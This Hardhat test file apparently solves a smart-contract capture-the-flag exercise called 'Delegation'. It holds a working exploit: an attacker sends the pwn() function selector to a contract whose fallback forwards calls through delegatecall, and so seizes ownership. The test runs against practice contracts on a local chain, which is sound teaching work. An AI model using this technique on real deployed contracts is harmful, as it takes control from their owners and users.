const { expect } = require("chai");
const { ethers } = require("hardhat");
const Web3Utils = require('web3-utils');

describe("Exercise 6 - Delegation", function () {

    let deployer, attacker;

    beforeEach(async function () {
        [deployer, attacker] = await ethers.getSigners();

        const Delegate = await ethers.getContractFactory("Delegate");
        this.delegateContract = await Delegate.deploy(deployer.address);
        await this.delegateContract.deployed();

        const Delegation = await ethers.getContractFactory("Delegation");
        this.delegationContract = await Delegation.deploy(this.delegateContract.address);
        await this.delegationContract.deployed();

        // Initially, deployer should be the owner
        expect(await this.delegationContract.owner()).to.eq(deployer.address)
    });


    it("Claim ownership", async function () {

        // fallback Delegation func will be called - need to provide method pwn() from Delegate contract in data
        //
        // In solidity, the bytecode for functions is taking the web3.sha3 value of a function name and
        // taking the first 4 bytes of the resulting hash in the format of 0x00000000
        const funcByteCode = Web3Utils.sha3("pwn()").slice(0, 10);

        await attacker.sendTransaction({
            to: this.delegationContract.address,
            data: funcByteCode,
        });

        expect(await this.delegationContract.owner()).to.eq(attacker.address);

    });

});
